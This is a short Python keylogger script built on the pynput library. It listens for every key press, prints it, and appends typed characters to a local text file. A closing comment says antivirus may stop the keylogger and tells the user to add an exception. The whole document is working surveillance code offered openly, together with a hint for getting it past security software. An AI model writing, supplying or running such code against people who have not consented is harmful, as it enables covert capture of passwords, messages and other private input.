#import libraries
from pynput import keyboard


#define key press
def keyPressed(key):

    

    #print key press and record to text file
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:

    #try and except bar for error handling from nonchar such as spacebars
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")
    



#define listener
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()


#keylogger may be stopped by antivirus, make exception in popup